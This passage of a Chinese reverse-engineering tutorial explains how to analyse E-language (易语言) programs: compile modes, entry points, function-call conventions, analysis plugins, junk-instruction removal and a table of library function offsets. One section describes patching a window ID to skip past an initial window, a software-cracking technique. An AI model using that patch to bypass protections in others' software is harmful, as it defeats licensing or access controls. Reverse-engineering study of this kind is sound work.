alt=\"document_image_rId10\"></p>\n<ul>\n<li>非静态编译：编译程序时，将所有用到的库文件写入到程序中，与程序合并，编译出来的文件只有程序本身。</li>\n</ul>\n<p><img src=\"/../images/Reverse/%E6%92%95%E5%BC%80%E6%98%93%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F/document_image_rId11.png\" alt=\"document_image_rId11\"></p>\n<ul>\n<li>独立编译：与静态编译相同之处是编译出来后只有程序本身，但运行程序时，会将所有用到的库文件写入到临时目录中，然后加载库文件。</li>\n</ul>\n<p><img src=\"/../images/Reverse/%E6%92%95%E5%BC%80%E6%98%93%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F/document_image_rId12.png\" alt=\"document_image_rId12\"></p>\n<p><img src=\"/../images/Reverse/%E6%92%95%E5%BC%80%E6%98%93%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F/document_image_rId13.png\" alt=\"document_image_rId13\"></p>\n<h3 id=\"四、字符串特征\"><a href=\"#四、字符串特征\" class=\"headerlink\" title=\"四、字符串特征\"></a>四、字符串特征</h3><p>由于易语言是自写的框架，类似于MFC，因此如果未处理编译后的程序，程序中将存在一些固定的字符串。</p>\n<p><img src=\"/../images/Reverse/%E6%92%95%E5%BC%80%E6%98%93%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F/document_image_rId14.png\" alt=\"document_image_rId14\"></p>\n<p><img src=\"/../images/Reverse/%E6%92%95%E5%BC%80%E6%98%93%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F/document_image_rId15.png\" alt=\"document_image_rId15\"></p>\n<h3 id=\"五、易语言标准入口\"><a href=\"#五、易语言标准入口\" class=\"headerlink\" title=\"五、易语言标准入口\"></a>五、易语言标准入口</h3><p><img src=\"/../images/Reverse/%E6%92%95%E5%BC%80%E6%98%93%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F/document_image_rId16.png\" alt=\"document_image_rId16\"></p>\n<h3 id=\"①静态编译\"><a href=\"#①静态编译\" class=\"headerlink\" title=\"①静态编译\"></a>①静态编译</h3><p>静态编译是直接将库文件与程序合并。</p>\n<p><img src=\"/../images/Reverse/%E6%92%95%E5%BC%80%E6%98%93%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F/document_image_rId17.png\" alt=\"document_image_rId17\"></p>\n<p><img src=\"/../images/Reverse/%E6%92%95%E5%BC%80%E6%98%93%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F/document_image_rId18.png\" alt=\"document_image_rId18\"></p>\n<p><img src=\"/../images/Reverse/%E6%92%95%E5%BC%80%E6%98%93%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F/document_image_rId19.png\" alt=\"document_image_rId19\"></p>\n<h3 id=\"②非静态编译\"><a href=\"#②非静态编译\" class=\"headerlink\" title=\"②非静态编译\"></a>②非静态编译</h3><p>该种编译模式会将库文件存放在程序中，在WinMain入口会获取读取自身的内容，然后释放出库文件。</p>\n<p><img src=\"/../images/Reverse/%E6%92%95%E5%BC%80%E6%98%93%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F/document_image_rId20.png\" alt=\"document_image_rId20\"></p>\n<p><img src=\"/../images/Reverse/%E6%92%95%E5%BC%80%E6%98%93%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F/document_image_rId21.png\" alt=\"document_image_rId21\"></p>\n<p>随后加载库文件，并调用一个固定函数<code>GetNewSock</code>。</p>\n<p><img src=\"/../images/Reverse/%E6%92%95%E5%BC%80%E6%98%93%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F/document_image_rId22.png\" alt=\"document_image_rId22\"></p>\n<p>最后调用函数</p>\n<p><img src=\"/../images/Reverse/%E6%92%95%E5%BC%80%E6%98%93%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F/document_image_rId23.png\" alt=\"document_image_rId23\"></p>\n<p>进入该函数后，会看到call eax，eax为函数入口。</p>\n<p><img src=\"/../images/Reverse/%E6%92%95%E5%BC%80%E6%98%93%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F/document_image_rId24.png\" alt=\"document_image_rId24\"></p>\n<p><img src=\"/../images/Reverse/%E6%92%95%E5%BC%80%E6%98%93%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F/document_image_rId25.png\" alt=\"document_image_rId25\"></p>\n<h3 id=\"③黑月编译\"><a href=\"#③黑月编译\" class=\"headerlink\" title=\"③黑月编译\"></a>③黑月编译</h3><p>黑月编译器是网友针对易语言程序编写的一款编译器，他直接会优化掉前期的初始化代码，包括<code>clr(c library runtime)</code>初始化，直接进入到易语言的标准入口。</p>\n<p><img src=\"/../images/Reverse/%E6%92%95%E5%BC%80%E6%98%93%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F/document_image_rId26.png\" alt=\"document_image_rId26\"></p>\n<p><img src=\"/../images/Reverse/%E6%92%95%E5%BC%80%E6%98%93%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F/document_image_rId27.png\" alt=\"document_image_rId27\"></p>\n<p><img src=\"/../images/Reverse/%E6%92%95%E5%BC%80%E6%98%93%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F/document_image_rId28.png\" alt=\"document_image_rId28\"></p>\n<h1 id=\"2、易语言的函数类型及特征\"><a href=\"#2、易语言的函数类型及特征\" class=\"headerlink\" title=\"2、易语言的函数类型及特征\"></a>2、易语言的函数类型及特征</h1><p>易语言的函数大致分有三种，分别为窗体控件的消息函数、用户自定义函数、库函数和组件属性函数。</p>\n<p><img src=\"/../images/Reverse/%E6%92%95%E5%BC%80%E6%98%93%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F/document_image_rId29.png\" alt=\"document_image_rId29\"></p>\n<h3 id=\"一、消息函数\"><a href=\"#一、消息函数\" class=\"headerlink\" title=\"一、消息函数\"></a>一、消息函数</h3><p>消息函数都是通过固定代码段调用，代码段定位流程如下：</p>\n<p><img src=\"/../images/Reverse/%E6%92%95%E5%BC%80%E6%98%93%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F/document_image_rId30.png\" alt=\"document_image_rId30\"></p>\n<p>找到如图特征</p>\n<p><img src=\"/../images/Reverse/%E6%92%95%E5%BC%80%E6%98%93%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F/document_image_rId31.png\" alt=\"document_image_rId31\"></p>\n<p>进入函数后找到最后一call 局部变量，该位置调用的就是消息函数</p>\n<p><img src=\"/../images/Reverse/%E6%92%95%E5%BC%80%E6%98%93%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F/document_image_rId32.png\" alt=\"document_image_rId32\"></p>\n<p>将函数对应到IDA中可直接定位到流程。</p>\n<p><img src=\"/../images/Reverse/%E6%92%95%E5%BC%80%E6%98%93%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F/document_image_rId33.png\" alt=\"document_image_rId33\"></p>\n<p><img src=\"/../images/Reverse/%E6%92%95%E5%BC%80%E6%98%93%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F/document_image_rId34.png\" alt=\"document_image_rId34\"></p>\n<p><img src=\"/../images/Reverse/%E6%92%95%E5%BC%80%E6%98%93%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F/document_image_rId35.png\" alt=\"document_image_rId35\"></p>\n<p>找到 case 2008:</p>\n<p><img src=\"/../images/Reverse/%E6%92%95%E5%BC%80%E6%98%93%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F/document_image_rId36.png\" alt=\"document_image_rId36\"></p>\n<p><img src=\"/../images/Reverse/%E6%92%95%E5%BC%80%E6%98%93%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F/document_image_rId37.png\" alt=\"document_image_rId37\"></p>\n<h3 id=\"二、用户自定义函数\"><a href=\"#二、用户自定义函数\" class=\"headerlink\" title=\"二、用户自定义函数\"></a>二、用户自定义函数</h3><p>用户自定义的函数调用与通常的函数调用方式一致。</p>\n<p><img src=\"/../images/Reverse/%E6%92%95%E5%BC%80%E6%98%93%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F/document_image_rId38.png\" alt=\"document_image_rId38\"></p>\n<h3 id=\"三、库函数\"><a href=\"#三、库函数\" class=\"headerlink\" title=\"三、库函数\"></a>三、库函数</h3><p>库函数为易语言自写支持库里的函数，类似Windows的DLL文件。函数原型如下。</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">E_FuncCallBack</span>(<span class=\"number\">2</span>,参数一的值，参数一是否可忽略，参数一的类型，参数二的值，参数二是否可忽略，参数二的类型)</span><br></pre></td></tr></table></figure>\n\n<p>该函数是一个变参函数，参数一为<strong>欲调用欲调用函数的参数个数</strong>，然后其余的以<strong>三个参数为一组</strong>表示参数的信息。忽略参数的值为布尔值，0表示不可以忽略，1表示可忽略；其参数类型可参考的值如下（可能不完整）：</p>\n<table>\n<thead>\n<tr>\n<th>值</th>\n<th>类型</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>0x80000004</td>\n<td>文本型</td>\n</tr>\n<tr>\n<td>0x80000101</td>\n<td>文本型</td>\n</tr>\n<tr>\n<td>0x80000000</td>\n<td>通用型</td>\n</tr>\n<tr>\n<td>0x80000002</td>\n<td>逻辑型</td>\n</tr>\n<tr>\n<td>0x80000005</td>\n<td>字节集</td>\n</tr>\n<tr>\n<td>0x80000006</td>\n<td>子程序指针</td>\n</tr>\n<tr>\n<td>0x80000301</td>\n<td>数值型</td>\n</tr>\n<tr>\n<td>0x80000601</td>\n<td>数值型</td>\n</tr>\n<tr>\n<td>0x10001</td>\n<td>窗体</td>\n</tr>\n</tbody></table>\n<p>由于易语言的编译模式不同，库函数调用代码也会产生差异。接下来分别解释静态编译与非静态编译下，函数代码的差异。</p>\n<ul>\n<li>静态编译</li>\n</ul>\n<p><img src=\"/../images/Reverse/%E6%92%95%E5%BC%80%E6%98%93%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F/document_image_rId39.png\" alt=\"document_image_rId39\"></p>\n<ul>\n<li>非静态编译</li>\n</ul>\n<p><img src=\"/../images/Reverse/%E6%92%95%E5%BC%80%E6%98%93%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F/document_image_rId40.png\" alt=\"document_image_rId40\"></p>\n<p><img src=\"/../images/Reverse/%E6%92%95%E5%BC%80%E6%98%93%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F/document_image_rId41.png\" alt=\"document_image_rId41\"></p>\n<p>非静态编译的程序，在调用库函数时不再通过静态地址的方式调用，而是通过传入库文件序号和欲调用对应函数的偏移到寄存器中，然后调用。</p>\n<p>库文件序号指的是库文件是程序中加载的第几个文件。序号从0开始，易语言程序在运行初期最先加载的库文件为该库文件，记加载序号为0；如果再加载一个库文件的话则加载新加载的库文件序号为1。<strong>对于调用krnln.fnr库文件的函数，易语言程序以隐式形式传递序号</strong>，因此在信息框函数调用的反汇编代码中并未看到传入0序号。常用库文件的函数偏移在附录中贴出。</p>\n<h3 id=\"四、组件属性函数\"><a href=\"#四、组件属性函数\" class=\"headerlink\" title=\"四、组件属性函数\"></a>四、组件属性函数</h3><p>函数分为两种，一种是对组件的属性修改，另一种是组件的自带函数。</p>\n<ul>\n<li>属性修改</li>\n</ul>\n<p><strong>参数一：</strong>父窗口</p>\n<p><strong>参数二：</strong>子窗口</p>\n<p><strong>参数三：</strong>属性下标</p>\n<p><strong>参数四：</strong>未知，一般都为-0x1</p>\n<p><strong>参数五：</strong>值</p>\n<p><img src=\"/../images/Reverse/%E6%92%95%E5%BC%80%E6%98%93%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F/document_image_rId42.png\" alt=\"document_image_rId42\"></p>\n<ul>\n<li>自带函数调用</li>\n</ul>\n<p>与消息函数类型。参一：<strong>参数个数</strong>、参二：<strong>值，也就是父窗口ID</strong>、参三：<strong>ID</strong>、参四：<strong>参数类型</strong></p>\n<p><img src=\"/../images/Reverse/%E6%92%95%E5%BC%80%E6%98%93%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F/document_image_rId43.png\" alt=\"document_image_rId43\"></p>\n<p>因为控件存在于krnln.fnr库中，因此在非静态编译中，库函数序号也是隐式传递。部分组件ID也在附录中列出。</p>\n<h1 id=\"3、易语言的基本数据类型\"><a href=\"#3、易语言的基本数据类型\" class=\"headerlink\" title=\"3、易语言的基本数据类型\"></a>3、易语言的基本数据类型</h1><h3 id=\"一、字节集\"><a href=\"#一、字节集\" class=\"headerlink\" title=\"一、字节集\"></a>一、字节集</h3><p>typdef struct 字节集<br>{<br>int unkown;<br>int length;<br>char* bytes;<br>};</p>\n<h1 id=\"4、编译器：黑月\"><a href=\"#4、编译器：黑月\" class=\"headerlink\" title=\"4、编译器：黑月\"></a>4、编译器：黑月</h1><p>程序入口为两个函数。</p>\n<p><img src=\"/../images/Reverse/%E6%92%95%E5%BC%80%E6%98%93%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F/document_image_rId44.png\" alt=\"document_image_rId44\"></p>\n<p>进入第二个后可以看到如下代码特征。</p>\n<p><img src=\"/../images/Reverse/%E6%92%95%E5%BC%80%E6%98%93%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F/document_image_rId45.png\" alt=\"document_image_rId45\"></p>\n<p>或者搜索到如下字符串。</p>\n<p><img src=\"/../images/Reverse/%E6%92%95%E5%BC%80%E6%98%93%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F/document_image_rId46.png\" alt=\"document_image_rId46\"></p>\n<h1 id=\"5、易语言分析插件\"><a href=\"#5、易语言分析插件\" class=\"headerlink\" title=\"5、易语言分析插件\"></a>5、易语言分析插件</h1><h3 id=\"一、E-Debug（https-github-com-fjqisba-E-debug-plus）\"><a href=\"#一、E-Debug（https-github-com-fjqisba-E-debug-plus）\" class=\"headerlink\" title=\"一、E-Debug（https://github.com/fjqisba/E-debug-plus）\"></a>一、E-Debug（<a href=\"https://github.com/fjqisba/E-debug-plus\">https://github.com/fjqisba/E-debug-plus</a>）</h3><p>只能用来分析静态编译的程序。</p>\n<ul>\n<li>OD</li>\n</ul>\n<p><img src=\"/../images/Reverse/%E6%92%95%E5%BC%80%E6%98%93%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F/document_image_rId48.png\" alt=\"document_image_rId48\"></p>\n<ul>\n<li>IDA</li>\n</ul>\n<p>选择易语言反编译器</p>\n<p><img src=\"/../images/Reverse/%E6%92%95%E5%BC%80%E6%98%93%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F/document_image_rId49.png\" alt=\"document_image_rId49\"></p>\n<p>IDA会自动识别由于的函数，并在工具栏新增易语言。</p>\n<p><img src=\"/../images/Reverse/%E6%92%95%E5%BC%80%E6%98%93%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F/document_image_rId50.png\" alt=\"document_image_rId50\"></p>\n<p>新增的项可以自动识别资源常量、窗体、消息函数（控件函数）。</p>\n<p><img src=\"/../images/Reverse/%E6%92%95%E5%BC%80%E6%98%93%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F/document_image_rId51.png\" alt=\"document_image_rId51\"></p>\n<ul>\n<li>特征生成</li>\n</ul>\n<p>EDebug可以手动生成后缀为sig的易语言特征，打开配套工具。</p>\n<p><img src=\"/../images/Reverse/%E6%92%95%E5%BC%80%E6%98%93%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F/document_image_rId52.png\" alt=\"document_image_rId52\"></p>\n<p>然后将易语言的支持库拖入即可，最后将生成的sig文件放置到对应分析工具的插件目录下。</p>\n<h1 id=\"6、花指令\"><a href=\"#6、花指令\" class=\"headerlink\" title=\"6、花指令\"></a>6、花指令</h1><p>易语言可以设置花指令来干扰程序的逆向分析。在工具栏的工具-系统配置的窗口中选择安全，可以设置花指令等级，默认为1。</p>\n<p><img src=\"/../images/Reverse/%E6%92%95%E5%BC%80%E6%98%93%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F/document_image_rId53.png\" alt=\"document_image_rId53\"></p>\n<p>级别不同，花指令形式也不同。</p>\n<p><img src=\"/../images/Reverse/%E6%92%95%E5%BC%80%E6%98%93%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F/document_image_rId54.png\" alt=\"document_image_rId54\"></p>\n<p>但是每一级别的花指令代码都是固定的，所以可以在IDA中使用脚本进行批处理处理，或者使用OD的插件去除花指令。</p>\n<p><img src=\"/../images/Reverse/%E6%92%95%E5%BC%80%E6%98%93%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F/document_image_rId55.png\" alt=\"document_image_rId55\"></p>\n<p>输入要去除花指令的起始地址和地址段大小后，点击执行即可去除。</p>\n<p><img src=\"/../images/Reverse/%E6%92%95%E5%BC%80%E6%98%93%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F/document_image_rId56.png\" alt=\"document_image_rId56\"></p>\n<h1 id=\"7、针对一些窗口跳转的破解\"><a href=\"#7、针对一些窗口跳转的破解\" class=\"headerlink\" title=\"7、针对一些窗口跳转的破解\"></a>7、针对一些窗口跳转的破解</h1><p>易语言载入窗口的命令为载入(,,)，窗体的类型为0x10001，因此可以通过搜索push 0x10001来找到该命令，或者有调用窗口函数的代码段来获取窗口ID。再将原始加载的窗口ID进行替换即可实现窗口跳转。</p>\n<p>搜索push 0x10001结果。</p>\n<p><img src=\"/../images/Reverse/%E6%92%95%E5%BC%80%E6%98%93%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F/document_image_rId57.png\" alt=\"document_image_rId57\"></p>\n<p><img src=\"/../images/Reverse/%E6%92%95%E5%BC%80%E6%98%93%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F/document_image_rId58.png\" alt=\"document_image_rId58\"></p>\n<p><img src=\"/../images/Reverse/%E6%92%95%E5%BC%80%E6%98%93%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F/document_image_rId59.png\" alt=\"document_image_rId59\"></p>\n<p>断点放开后执行，直接能跳转到第二个窗口。</p>\n<p><img src=\"/../images/Reverse/%E6%92%95%E5%BC%80%E6%98%93%E8%AF%AD%E8%A8%80%E7%A8%8B%E5%BA%8F/document_image_rId60.png\" alt=\"document_image_rId60\"></p>\n<h1 id=\"8、附录\"><a href=\"#8、附录\" class=\"headerlink\" title=\"8、附录\"></a>8、附录</h1><h3 id=\"一、支持库函数偏移\"><a href=\"#一、支持库函数偏移\" class=\"headerlink\" title=\"一、支持库函数偏移\"></a>一、支持库函数偏移</h3><h3 id=\"系统核心支持库——krnln\"><a href=\"#系统核心支持库——krnln\" class=\"headerlink\" title=\"系统核心支持库——krnln\"></a>系统核心支持库——krnln</h3><figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">0x0</span>：寻找文件</span><br><span class=\"line\"><span class=\"number\">0x2</span>：相加</span><br><span class=\"line\"><span class=\"number\">0x9</span>：新建索引</span><br><span class=\"line\"><span class=\"number\">0x58</span>：取符号</span><br><span class=\"line\"><span class=\"number\">0x5C</span>：取绝对值</span><br><span class=\"line\"><span class=\"number\">0x60</span>：取整</span><br><span class=\"line\"><span class=\"number\">0x64</span>：绝对取整</span><br><span class=\"line\"><span class=\"number\">0x68</span>：四舍五入</span><br><span class=\"line\"><span class=\"number\">0x6C</span>：求次方</span><br><span class=\"line\"><span class=\"number\">0x70</span>：求平方根</span><br><span class=\"line\"><span class=\"number\">0x74</span>：求正弦</span><br><span class=\"line\"><span class=\"number\">0x78</span>：求余弦</span><br><span class=\"line\"><span class=\"number\">0x7C</span>：求正切</span><br><span class=\"line\"><span class=\"number\">0x80</span>：求反正切</span><br><span class=\"line\"><span class=\"number\">0x84</span>：求自然对数</span><br><span class=\"line\"><span class=\"number\">0x88</span>：求反对数</span><br><span class=\"line\"><span class=\"number\">0x8C</span>：是否运算正确</span><br><span class=\"line\"><span class=\"number\">0x90</span>：置随机数种子</span><br><span class=\"line\"><span class=\"number\">0x94</span>：取随机数</span><br><span class=\"line\"><span class=\"number\">0xC0</span>：位取反</span><br><span class=\"line\"><span class=\"number\">0xC4</span>：位与</span><br><span class=\"line\"><span class=\"number\">0xC8</span>：位或</span><br><span class=\"line\"><span class=\"number\">0xCC</span>：位异或</span><br><span class=\"line\"><span class=\"number\">0x100</span>：取命令行</span><br><span class=\"line\"><span class=\"number\">0x104</span>：取运行目录</span><br><span class=\"line\"><span class=\"number\">0x108</span>：取执行文件名</span><br><span class=\"line\"><span class=\"number\">0x10C</span>：读环境变量</span><br><span class=\"line\"><span class=\"number\">0x110</span>：写环境变量</span><br><span class=\"line\"><span class=\"number\">0x114</span>：取所有发音</span><br><span class=\"line\"><span class=\"number\">0x118</span>：取发音数目</span><br><span class=\"line\"><span class=\"number\">0x11C</span>：取拼音</span><br><span class=\"line\"><span class=\"number\">0x124</span>：取韵母</span><br><span class=\"line\"><span class=\"number\">0x128</span>：发音比较</span><br><span class=\"line\"><span class=\"number\">0x12C</span>：输入字比较</span><br><span class=\"line\"><span class=\"number\">0x130</span>：取文本长度</span><br><span class=\"line\"><span class=\"number\">0x134</span>：取文本左边</span><br><span class=\"line\"><span class=\"number\">0x138</span>：取文本右边</span><br><span class=\"line\"><span class=\"number\">0x13C</span>：取文本中间</span><br><span class=\"line\"><span class=\"number\">0x140</span>：字符</span><br><span class=\"line\"><span class=\"number\">0x144</span>：取代码</span><br><span class=\"line\"><span class=\"number\">0x148</span>：寻找文本</span><br><span class=\"line\"><span class=\"number\">0x14C</span>：倒找文本</span><br><span class=\"line\"><span class=\"number\">0x150</span>：到大写</span><br><span class=\"line\"><span class=\"number\">0x154</span>：到小写</span><br><span class=\"line\"><span class=\"number\">0x158</span>：到全角</span><br><span class=\"line\"><span class=\"number\">0x15C</span>：到半角</span><br><span class=\"line\"><span class=\"number\">0x160</span>：到时间</span><br><span class=\"line\"><span class=\"number\">0x164</span>：到数值</span><br><span class=\"line\"><span class=\"number\">0x168</span>：到文本</span><br><span class=\"line\"><span class=\"number\">0x16C</span>：删首空</span><br><span class=\"line\"><span class=\"number\">0x170</span>：删尾空</span><br><span class=\"line\"><span class=\"number\">0x174</span>：删首位空</span><br><span class=\"line\"><span class=\"number\">0x178</span>：删全部空</span><br><span class=\"line\"><span class=\"number\">0x17C</span>：文本替换</span><br><span class=\"line\"><span class=\"number\">0x180</span>：子文本替换</span><br><span class=\"line\"><span class=\"number\">0x184</span>：取空白文本</span><br><span class=\"line\"><span class=\"number\">0x188</span>：取重复文本</span><br><span class=\"line\"><span class=\"number\">0x18C</span>：文本比较</span><br><span class=\"line\"><span class=\"number\">0x190</span>：分割文本</span><br><span class=\"line\"><span class=\"number\">0x194</span>：取字节集长度</span><br><span class=\"line\"><span class=\"number\">0x198</span>：到字节集</span><br><span class=\"line\"><span class=\"number\">0x19C</span>：取字节集数据</span><br><span class=\"line\"><span class=\"number\">0x1A0</span>：取字节集左边</span><br><span class=\"line\"><span class=\"number\">0x1A4</span>：取字节集右边</span><br><span class=\"line\"><span class=\"number\">0x1A8</span>：取字节集中间</span><br><span class=\"line\"><span class=\"number\">0x1AC</span>：寻找字节集</span><br><span class=\"line\"><span class=\"number\">0x1B0</span>：倒找字节集</span><br><span class=\"line\"><span class=\"number\">0x1B4</span>：字节集替换</span><br><span class=\"line\"><span class=\"number\">0x1B8</span>：子字节集替换</span><br><span class=\"line\"><span class=\"number\">0x1BC</span>：取空白字节集</span><br><span class=\"line\"><span class=\"number\">0x1C0</span>：去重复字节集</span><br><span class=\"line\"><span class=\"number\">0x1C4</span>：分割字节集</span><br><span class=\"line\"><span class=\"number\">0x1C8</span>：数值到大写</span><br><span class=\"line\"><span class=\"number\">0x1CC</span>：数值到金额</span><br><span class=\"line\"><span class=\"number\">0x1D0</span>：数值到格式文本</span><br><span class=\"line\"><span class=\"number\">0x1D4</span>：取十六进制文本</span><br><span class=\"line\"><span class=\"number\">0x1D8</span>：取八进制文本</span><br><span class=\"line\"><span class=\"number\">0x1DC</span>：增减时间</span><br><span class=\"line\"><span class=\"number\">0x1E0</span>：取时间间隔</span><br><span class=\"line\"><span class=\"number\">0x1E4</span>：取某月天数</span><br><span class=\"line\"><span class=\"number\">0x1E8</span>：时间到文本</span><br><span class=\"line\"><span class=\"number\">0x1EC</span>：取时间部分</span><br><span class=\"line\"><span class=\"number\">0x1F0</span>：取年份</span><br><span class=\"line\"><span class=\"number\">0x1F4</span>：取月份</span><br><span class=\"line\"><span class=\"number\">0x1F8</span>：取日</span><br><span class=\"line\"><span class=\"number\">0x1FC</span>：取星期几</span><br><span class=\"line\"><span class=\"number\">0x200</span>：取小时</span><br><span class=\"line\"><span class=\"number\">0x204</span>：取分钟</span><br><span class=\"line\"><span class=\"number\">0x208</span>：取秒</span><br><span class=\"line\"><span class=\"number\">0x20C</span>：指定时间</span><br><span class=\"line\"><span class=\"number\">0x210</span>：取现行时间</span><br><span class=\"line\"><span class=\"number\">0x214</span>：置现行时间</span><br><span class=\"line\"><span class=\"number\">0x218</span>：取磁盘总空间</span><br><span class=\"line\"><span class=\"number\">0x21C</span>：取磁盘剩余空间</span><br><span class=\"line\"><span class=\"number\">0x220</span>：取磁盘卷标</span><br><span class=\"line\"><span class=\"number\">0x224</span>：置磁盘卷标</span><br><span class=\"line\"><span class=\"number\">0x228</span>：改变驱动器</span><br><span class=\"line\"><span class=\"number\">0x22C</span>：改变目录</span><br><span class=\"line\"><span class=\"number\">0x230</span>：取当前目录</span><br><span class=\"line\"><span class=\"number\">0x234</span>：创建目录</span><br><span class=\"line\"><span class=\"number\">0x238</span>：删除目录</span><br><span class=\"line\"><span class=\"number\">0x23C</span>：复制文件</span><br><span class=\"line\"><span class=\"number\">0x240</span>：移动文件</span><br><span class=\"line\"><span class=\"number\">0x244</span>：删除文件</span><br><span class=\"line\"><span class=\"number\">0x248</span>：文件更名</span><br><span class=\"line\"><span class=\"number\">0x24C</span>：文件是否存在</span><br><span class=\"line\"><span class=\"number\">0x254</span>：取文件时间</span><br><span class=\"line\"><span class=\"number\">0x258</span>：取文件尺寸</span><br><span class=\"line\"><span class=\"number\">0x25C</span>：取文件属性</span><br><span class=\"line\"><span class=\"number\">0x260</span>：置文件属性</span><br><span class=\"line\"><span class=\"number\">0x264</span>：取临时文件名</span><br><span class=\"line\"><span class=\"number\">0x268</span>：读入文件</span><br><span class=\"line\"><span class=\"number\">0x26C</span>：写到文件</span><br><span class=\"line\"><span class=\"number\">0x270</span>：打开文件</span><br><span class=\"line\"><span class=\"number\">0x274</span>：打开内存文件</span><br><span class=\"line\"><span class=\"number\">0x278</span>：关闭文件</span><br><span class=\"line\"><span class=\"number\">0x27C</span>：关闭所有文件</span><br><span class=\"line\"><span class=\"number\">0x280</span>：锁住文件</span><br><span class=\"line\"><span class=\"number\">0x284</span>：解锁文件</span><br><span class=\"line\"><span class=\"number\">0x288</span>：移动读写位置</span><br><span class=\"line\"><span class=\"number\">0x28C</span>：移到文件首</span><br><span class=\"line\"><span class=\"number\">0x290</span>：移到文件尾</span><br><span class=\"line\"><span class=\"number\">0x294</span>：读入字节集</span><br><span class=\"line\"><span class=\"number\">0x298</span>：写出字节集</span><br><span class=\"line\"><span class=\"number\">0x268</span>：读入文件</span><br><span class=\"line\"><span class=\"number\">0x2A0</span>：写出文本</span><br><span class=\"line\"><span class=\"number\">0x2A4</span>：读入一行</span><br><span class=\"line\"><span class=\"number\">0x2A8</span>：写文本行</span><br><span class=\"line\"><span class=\"number\">0x2AC</span>：读入数据</span><br><span class=\"line\"><span class=\"number\">0x2B0</span>：写出数据</span><br><span class=\"line\"><span class=\"number\">0x2B4</span>：是否在文件尾</span><br><span class=\"line\"><span class=\"number\">0x2B8</span>：取读写位置</span><br><span class=\"line\"><span class=\"number\">0x2BC</span>：取文件长度</span><br><span class=\"line\"><span class=\"number\">0x2C0</span>：运行</span><br><span class=\"line\"><span class=\"number\">0x2C4</span>：取剪辑板文本</span><br><span class=\"line\"><span class=\"number\">0x2C8</span>：置剪辑板文本</span><br><span class=\"line\"><span class=\"number\">0x2CC</span>：剪辑板中可有文本</span><br><span class=\"line\"><span class=\"number\">0x2D0</span>：清除剪辑板</span><br><span class=\"line\"><span class=\"number\">0x2D4</span>：取屏幕宽度</span><br><span class=\"line\"><span class=\"number\">0x2D8</span>：取屏幕高度</span><br><span class=\"line\"><span class=\"number\">0x2DC</span>：取鼠标水平位置</span><br><span class=\"line\"><span class=\"number\">0x2E0</span>：取鼠标垂直位置</span><br><span class=\"line\"><span class=\"number\">0x300</span>：信息框</span><br><span class=\"line\"><span class=\"number\">0x304</span>：鸣叫</span><br><span class=\"line\"><span class=\"number\">0x308</span>：取启动时间</span><br><span class=\"line\"><span class=\"number\">0x320</span>：载入</span><br><span class=\"line\"><span class=\"number\">0x330</span>：是否已创建</span><br><span class=\"line\"><span class=\"number\">0x334</span>：取数据类型尺寸</span><br><span class=\"line\"><span class=\"number\">0x35C</span>：取窗口句柄</span><br><span class=\"line\"><span class=\"number\">0x540</span>：是否支持多用户</span><br><span class=\"line\"><span class=\"number\">0x544</span>：取错误码</span><br><span class=\"line\"><span class=\"number\">0x548</span>：取错误信息</span><br><span class=\"line\"><span class=\"number\">0x54C</span>：创建</span><br><span class=\"line\"><span class=\"number\">0x550</span>：打开</span><br><span class=\"line\"><span class=\"number\">0x554</span>：替换打开</span><br><span class=\"line\"><span class=\"number\">0x558</span>：置当前库</span><br><span class=\"line\"><span 